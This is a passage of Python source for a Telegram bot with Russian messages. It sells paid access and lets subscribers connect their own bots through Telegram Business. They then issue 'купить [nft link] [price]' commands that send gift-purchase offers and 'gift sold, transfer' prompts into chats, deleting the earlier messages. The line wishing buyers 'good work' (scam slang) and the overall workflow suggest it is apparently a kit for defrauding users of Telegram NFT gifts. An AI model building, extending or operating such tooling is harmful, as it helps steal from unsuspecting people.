        await call.answer("❌ Транзакция не найдена.\n\nПроверьте что:\n• Вы отправили нужную сумму\n• Указали правильный memo\n• Прошло несколько секунд после отправки", show_alert=True)


@dp.callback_query(F.data.startswith("approve_payment:"))
async def approve_payment_callback(call: CallbackQuery):
    """Ручное подтверждение оплаты овнером"""
    if not call.from_user or call.from_user.id != cfg.owner_id:
        await call.answer("Доступ запрещён", show_alert=True)
        return
    
    parts = call.data.split(":")
    if len(parts) != 3:
        await call.answer("Ошибка формата")
        return
    
    memo = parts[1]
    user_id = int(parts[2])
    
    payment = db.get_payment_by_memo(memo)
    if not payment:
        await call.answer("Платёж не найден", show_alert=True)
        return
    
    if payment["status"] == "paid":
        await call.answer("Уже обработан", show_alert=True)
        return
    
    # Подтверждаем оплату
    db.mark_payment_paid(payment["id"])
    db.add_access(user_id)
    db.unblock_offer_user(user_id)
    
    # Уведомляем пользователя
    success_text = ("✅ <b>Спасибо за покупку, удачного ворка!</b>\n\n"
                   "<b>Инструкция:</b>\n"
                   "<code>купить [ссылка нфт] [кол-во] зв/грам/р</code>\n\n"
                   "Пример:\n"
                   "<code>купить https://t.me/nft/PartySparkler-140864 150 грам</code>")
    try:
        await bot.send_message(user_id, success_text)
    except:
        pass
    
    await call.answer("✅ Оплата подтверждена, доступ выдан")
    try:
        await call.message.edit_text(f"{call.message.text}\n\n✅ ПОДТВЕРЖДЕНО")
    except:
        pass
async def admin_callback(call: CallbackQuery):
    if not call.from_user or call.from_user.id != cfg.owner_id:
        await call.answer("Доступ запрещён.", show_alert=True); return
    _, action, raw = call.data.split(":", 2)
    uid = int(raw)
    if action == "allow":
        await admin_allow(uid); await call.answer("Разрешено")
    elif action == "block":
        await admin_block(uid); await call.answer("Заблокировано")
    else:
        await call.answer("Неизвестное действие", show_alert=True)


@dp.callback_query(F.data.startswith("adm:"))
async def admin_callback(call: CallbackQuery):
    if not call.from_user or call.from_user.id != cfg.owner_id:
        await call.answer("Доступ запрещён.", show_alert=True); return
    _, action, raw = call.data.split(":", 2)
    uid = int(raw)
    if action == "allow":
        await admin_allow(uid); await call.answer("Разрешено")
    elif action == "block":
        await admin_block(uid); await call.answer("Заблокировано")
    else:
        await call.answer("Неизвестное действие", show_alert=True)


@dp.callback_query(F.data.startswith("of:"))
async def offer_callback(call: CallbackQuery):
    parts = call.data.split(":")
    if len(parts) < 3 or not parts[2].isdigit():
        await call.answer("Некорректный офер.", show_alert=True); return
    
    offer_id = int(parts[2])
    action = parts[1]
    
    # Обработка подтверждения передачи
    if action == "confirm":
        offer = db.get_offer(offer_id)
        if not offer:
            await call.answer("Офер не найден.", show_alert=True); return
        
        # Проверка что офер принят
        if offer["status"] != "accepted":
            await call.answer("Этот офер ещё не принят.", show_alert=True); return
        
        title = gift_title(offer["gift_name"], offer["gift_number"])
        amount = display_amount(offer["amount"], offer["currency"])
        
        # Определяем кто нажал кнопку - продавец (seller/кто кинул офер) или покупатель (buyer/кто принял)
        is_seller = call.from_user and call.from_user.id == offer["seller_id"]
        is_buyer = call.from_user and call.from_user.id == offer["buyer_id"]
        
        if not is_seller and not is_buyer:
            await call.answer("Это не ваш офер.", show_alert=True)
            return
        
        # Шаг 1: Продавец (тот кто СОЗДАЛ офер) подтверждает ПЕРВЫМ что готов передать
        if is_seller:
            if offer["seller_confirmed"]:
                await call.answer(t("already_confirmed", offer["locale"]), show_alert=True)
                return
            
            # Продавец подтверждает (БЕЗ кулдауна)
            db.confirm_seller(offer_id)
            
            message = t("seller_confirmed", offer["locale"])
            await call.answer(message, show_alert=True)
            return
        
        # Шаг 2: Покупатель (тот кто ПРИНЯЛ офер) подтверждает ВТОРЫМ что получил подарок
        if is_buyer:
            # Проверяем что продавец уже подтвердил
            if not offer["seller_confirmed"]:
                await call.answer(t("seller_not_confirmed", offer["locale"], title=title), show_alert=True)
                return
            
            if offer["buyer_confirmed"]:
                await call.answer(t("transfer_already_confirmed", offer["locale"]), show_alert=True)
                return
            
            # Покупатель подтверждает получение (БЕЗ кулдауна)
            db.confirm_buyer(offer_id)
            
            message = t("buyer_confirmed", offer["locale"], title=title, amount=amount)
            await call.answer(message, show_alert=True)
            return
        
        return
    
    # Обработка принятия/отклонения офера
    if action not in {"accept", "decline"}:
        await call.answer("Некорректный офер.", show_alert=True); return
    
    if offer_id not in offer_locks:
        offer_locks[offer_id] = asyncio.Lock()
    async with offer_locks[offer_id]:
        offer = db.get_offer(offer_id)
        if not offer or offer["status"] != "pending":
            await call.answer("Офер уже обработан.", show_alert=True); return
        if not call.message or call.message.message_id != offer["message_id"] or call.message.chat.id != offer["message_chat_id"]:
            await call.answer("Офер недействителен.", show_alert=True); return
        if action == "accept":
            url = offer["transfer_url"] or f"tg://user?id={offer['seller_id']}"
            title = gift_title(offer["gift_name"], offer["gift_number"])
            gift_url = offer["gift_url"]
            amount = display_amount(offer['amount'], offer['currency'])
            
            # Формируем текст с использованием переводов
            final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Gift: <a href=\"{gift_url}\">{title}</a> {t('offer_sold', offer['locale'])}\n\n{t('offer_transfer_text', offer['locale'], amount=amount)}"
            
            try:
                sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final,
                    reply_markup=transfer_keyboard(url, offer["locale"], offer_id),
                    link_preview_options=LinkPreviewOptions(url=gift_url, show_above_text=True))
                try:
                    await bot.delete_business_messages(business_connection_id=offer["business_connection_id"], message_ids=[offer["message_id"]])
                except Exception as e: log.warning("Could not delete accepted offer: %s", e)
                db.set_offer_message(offer_id, offer["buyer_id"], sent.message_id)
                db.update_offer_status(offer_id, "accepted", url)
                log.info("[OFFER ACCEPT] offer_id=%s seller_id=%s buyer_id=%s", offer_id, offer["seller_id"], offer["buyer_id"])
                
                # Уведомление продавцу
                answer_text = f"{title} {t('offer_sold', offer['locale'])}\n{t('offer_transfer_text', offer['locale'], amount=amount)}"
                await call.answer(answer_text, show_alert=True)
            except Exception:
                await call.answer("Не удалось завершить принятие офера. Попробуйте ещё раз.", show_alert=True)
        else:
            title = gift_title(offer["gift_name"], offer["gift_number"])
            gift_url = offer["gift_url"]
            final = f"<tg-emoji emoji-id=\"{DECLINE_EMOJI_ID}\">❌</tg-emoji> {t('offer_declined', offer['locale'])}"
            try:
                sent = await safe_send_business(offer["business_connection_id"], offer["buyer_id"], text=final)
                try:
                    await bot.delete_business_messages(business_connection_id=offer["business_connection_id"], message_ids=[offer["message_id"]])
                except Exception as e: log.warning("Could not delete declined offer: %s", e)
                db.set_offer_message(offer_id, offer["buyer_id"], sent.message_id)
                db.update_offer_status(offer_id, "declined")
                log.info("[OFFER DECLINE] offer_id=%s", offer_id)
                await call.answer("Предложение отклонено.")
            except Exception:
                await call.answer("Не удалось отклонить офер. Попробуйте ещё раз.", show_alert=True)


async def show_my_bots(message: Message):
    """Показать список ботов пользователя"""
    if not message.from_user:
        return
    
    # Проверяем доступ
    if not db.has_access(message.from_user.id, cfg.owner_id, cfg.offer_access_mode):
        await reply_message(message, t("no_access", "ru"))
        return
    
    user_bots = db.get_user_bots(message.from_user.id)
    
    if not user_bots:
        text = ("📱 <b>Ваши боты</b>\n\n"
               "У вас пока нет добавленных ботов.\n\n"
               "Используйте /addbot чтобы добавить своего бота.")
        
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="➕ Добавить бота", callback_data="add_bot")
        ]])
        
        try:
            if message.business_connection_id:
                await bot.send_message(
                    chat_id=message.chat.id,
                    business_connection_id=message.business_connection_id,
                    text=text,
                    reply_markup=kb
                )
            else:
                await message.answer(text, reply_markup=kb)
        except Exception as e:
            log.exception("Failed to send mybots")
        return
    
    text = "📱 <b>Ваши боты</b>\n\n"
    
    buttons = []
    for bot_data in user_bots:
        status = bot_manager.get_bot_status(bot_data["id"])
        username = bot_data["username"] or "неизвестно"
        text += f"{status} @{username}\n<code>ID: {bot_data['id']}</code>\n\n"
        
        buttons.append([
            InlineKeyboardButton(
                text=f"@{username}",
                callback_data=f"bot:info:{bot_data['id']}"
            )
        ])
    
    buttons.append([
        InlineKeyboardButton(text="➕ Добавить бота", callback_data="add_bot")
    ])
    
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    
    try:
        if message.business_connection_id:
            await bot.send_message(
                chat_id=message.chat.id,
                business_connection_id=message.business_connection_id,
                text=text,
                reply_markup=kb
            )
        else:
            await message.answer(text, reply_markup=kb)
    except Exception as e:
        log.exception("Failed to send mybots")


async def start_add_bot(message: Message, state: FSMContext):
    """Начало добавления бота"""
    if not message.from_user:
        return
    
    # Проверяем доступ
    if not db.has_access(message.from_user.id, cfg.owner_id, cfg.offer_access_mode):
        await reply_message(message, t("no_access", "ru"))
        return
    
    # Проверяем лимит (максимум 5 ботов на пользователя)
    bot_count = db.count_user_bots(message.from_user.id)
    if bot_count >= 5:
        await reply_message(message, "❌ Достигнут лимит ботов (максимум 5). Удалите старые боты чтобы добавить новые.")
        return
    
    await state.set_state(AddBotStates.waiting_for_token)
    await state.update_data(user_id=message.from_user.id)
    
    text = ("🤖 <b>Добавление бота</b>\n\n"
           "1. Создайте нового бота через @BotFather\n"
           "2. Скопируйте токен бота\n"
           "3. Отправьте его сюда (просто вставьте токен)\n\n"
           "Токен выглядит так:\n"
           "<code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n"
           "💡 <b>Совет:</b> Просто отправьте токен в любой момент, команда /addbot не обязательна!\n\n"
           "Отправьте /cancel для отмены.")
    
    await reply_message(message, text)


@dp.message(AddBotStates.waiting_for_token)
async def process_bot_token(message: Message, state: FSMContext):
    """Обработка токена бота"""
    if not message.from_user or not message.text:
        return
    
    token = message.text.strip()
    
    # Отмена
    if token.lower() == "/cancel":
        await state.clear()
        await reply_message(message, "❌ Добавление бота отменено.")
        return
    
    # Проверка формата токена
    if not ":" in token or len(token) < 40:
        await reply_message(message, "❌ Неверный формат токена. Попробуйте ещё раз или /cancel для отмены.")
        return
    
    # Проверяем что токен не используется
    existing = db.get_client_bot_by_token(token)
    if existing:
        await reply_message(message, "❌ Этот токен уже используется. Используйте другого бота.")
        await state.clear()
        return
    
    await reply_message(message, "⏳ Проверяю токен...")
    
    # Создаём временный бот для проверки
    try:
        test_bot = Bot(token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        me = await test_bot.get_me()
        await test_bot.session.close()
        
        username = me.username
        
        # Сохраняем в БД
        bot_id = db.create_client_bot(message.from_user.id, token, username)
        
        # Запускаем бота
        success, msg = await bot_manager.start_bot(bot_id, token, message.from_user.id)
        
        if success:
            text = (f"✅ <b>Бот добавлен!</b>\n\n"
                   f"@{username}\n"
                   f"ID: <code>{bot_id}</code>\n\n"
                   f"Теперь подключите к нему Telegram Business и отправляйте команду:\n"
                   f"<code>купить [ссылка нфт] [цена] грам/зв/р</code>")
            await reply_message(message, text)
        else:
            db.delete_client_bot(bot_id)
            await reply_message(message, f"❌ Ошибка запуска бота: {msg}")
        
    except Exception as e:
        log.error(f"Failed to add bot: {e}")
        await reply_message(message, f"❌ Ошибка проверки токена: {str(e)[:100]}")
    
    await state.clear()


# Обработчик для прямой отправки токена (без FSM)
async def handle_bot_token_direct(message: Message):
    """Обработка токена без FSM - для Business чатов"""
    if not message.from_user or not message.text:
        return
    
    token = message.text.strip()
    
    # Проверка что это похоже на токен
    if not ":" in token or len(token) < 40 or not token.split(":")[0].isdigit():
        return  # Не токен, пропускаем
    
    # Проверяем доступ
    if not db.has_access(message.from_user.id, cfg.owner_id, cfg.offer_access_mode):
        await reply_message(message, t("no_access", "ru"))
        return
    
    # Проверяем лимит
    bot_count = db.count_user_bots(message.from_user.id)
    if bot_count >= 5:
        await reply_message(message, "❌ Достигнут лимит ботов (максимум 5).")
        return
    
    # Проверяем что токен не используется
    existing = db.get_client_bot_by_token(token)
    if existing:
        await reply_message(message, "❌ Этот токен уже используется.")
        return
    
    await reply_message(message, "⏳ Проверяю токен...")
    
    try:
        test_bot = Bot(token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        me = await test_bot.get_me()
        await test_bot.session.close()
        
        username = me.username
        
        # Сохраняем в БД
        bot_id = db.create_client_bot(message.from_user.id, token, username)
        
        # Запускаем бота
        success, msg = await bot_manager.start_bot(bot_id, token, message.from_user.id)
        
        if success:
            text = (f"✅ <b>Бот добавлен!</b>\n\n"
                   f"@{username}\n"
                   f"ID: <code>{bot_id}</code>\n\n"
                   f"Подключите к нему Telegram Business и отправляйте:\n"
                   f"<code>купить [ссылка нфт] [цена] грам/зв/р</code>")
            await reply_message(message, text)
        else:
            db.delete_client_bot(bot_id)
            await reply_message(message, f"❌ Ошибка запуска: {msg}")
        
    except Exception as e:
        log.error(f"Failed to add bot: {e}")
        await reply_message(message, f"❌ Ошибка: {str(e)[:100]}")


async def show_all_bots(message: Message):
    """Показать все боты (только для админа)"""
    if not message.from_user or message.from_user.id != cfg.owner_id:
        return
    
    all_bots = bot_manager.get_all_statuses()
    
    if not all_bots:
        await reply_message(message, "📱 Нет зарегистрированных ботов.")
        return
    
    text = "📱 <b>Все клиентские боты</b>\n\n"
    
    for bot_data in all_bots:
        username = bot_data["username"] or "неизвестно"
        text += (f"{bot_data['status']} @{username}\n"
                f"ID: <code>{bot_data['id']}</code>\n"
                f"Owner: <code>{bot_data['owner_id']}</code>\n"
                f"Active: {'✅' if bot_data['is_active'] else '❌'}\n\n")
    
    text += "\n<b>Команды:</b>\n"
    text += "/startbot [id] - запустить\n"
    text += "/stopbot [id] - остановить\n"
    text += "/deletebot [id] - удалить"
    
    await reply_message(message, text)


@dp.callback_query(F.data == "add_bot")
async def add_bot_callback(call: CallbackQuery, state: FSMContext):
    """Кнопка добавления бота"""
    if not call.from_user:
        return
    
    if not call.message:
        await call.answer("Ошибка")
        return
    
    # Создаём фейковое сообщение для переиспользования логики
    fake_message = Message(
        message_id=call.message.message_id,
        date=call.message.date,
        chat=call.message.chat,
        from_user=call.from_user
    )
    
    await start_add_bot(fake_message, state)
    await call.answer()


@dp.callback_query(F.data.startswith("bot:info:"))
async def bot_info_callback(call: CallbackQuery):
    """Информация о боте"""
    if not call.from_user:
        return
    
    bot_id = int(call.data.split(":")[2])
    bot_data = db.get_client_bot(bot_id)
    
    if not bot_data:
        await call.answer("Бот не найден", show_alert=True)
        return
    
    # Проверяем что это бот пользователя или админ
    if bot_data["owner_id"] != call.from_user.id and call.from_user.id != cfg.owner_id:
        await call.answer("Это не ваш бот", show_alert=True)
        return
    
    status = bot_manager.get_bot_status(bot_id)
    username = bot_data["username"] or "неизвестно"
    
    text = (f"🤖 <b>@{username}</b>\n\n"
           f"ID: <code>{bot_id}</code>\n"
           f"Статус: {status}\n"
           f"Создан: {bot_data['created_at'][:10]}\n\n"
           f"Используйте команду:\n"
           f"<code>купить [ссылка нфт] [цена] грам/зв/р</code>")
    
    buttons = []
    
    # Кнопка удаления
    if bot_data["owner_id"] == call.from_user.id:
        buttons.append([
            InlineKeyboardButton(text="🗑 Удалить бота", callback_data=f"bot:delete:{bot_id}")
        ])
    
    buttons.append([
        InlineKeyboardButton(text="« Назад", callback_data="back_to_mybots")
    ])
    
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    
    try:
        await call.message.edit_text(text, reply_markup=kb)
    except:
        await call.message.answer(text, reply_markup=kb)
    
    await call.answer()


@dp.callback_query(F.data.startswith("bot:delete:"))
async def bot_delete_callback(call: CallbackQuery):
    """Удаление бота"""
    if not call.from_user:
        return
    
    bot_id = int(call.data.split(":")[2])
    bot_data = db.get_client_bot(bot_id)
    
    if not bot_data:
        await call.answer("Бот не найден", show_alert=True)
        return
    
    # Проверяем что это бот пользователя или админ
    if bot_data["owner_id"] != call.from_user.id and call.from_user.id != cfg.owner_id:
        await call.answer("Это не ваш бот", show_alert=True)
        return
    
    # Останавливаем и удаляем
    await bot_manager.stop_bot(bot_id)
    db.delete_client_bot(bot_id)
    
    await call.answer("✅ Бот удалён", show_alert=True)
    
    # Показываем обновлённый список
    if call.message:
        fake_message = Message(
            message_id=call.message.message_id,
            date=call.message.date,
            chat=call.message.chat,
            from_user=call.from_user
        )
        await show_my_bots(fake_message)


@dp.callback_query(F.data == "back_to_mybots")
async def back_to_mybots_callback(call: CallbackQuery):
    """Вернуться к списку ботов"""
    if not call.from_user or not call.message:
        return
    
    fake_message = Message(
        message_id=call.message.message_id,
        date=call.message.date,
        chat=call.message.chat,
        from_user=call.from_user
    )
    
    await show_my_bots(fake_message)
    await call.answer()


async def main():
    for uid in cfg.offer_always_allowed_ids:
        db.add_access(uid); db.unblock_offer_user(uid)
    
    # Запускаем все активные клиентские боты
    log.info("Loading client bots...")
    await bot_manager.load_all_bots()
    
    log.info("OfferBot starting; owner_id=%s database=%s", cfg.owner_id, cfg.database_path)
    
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        # Останавливаем все боты при завершении
        await bot_manager.stop_all()


if __name__ == "__main__":
    asyncio.run(main())
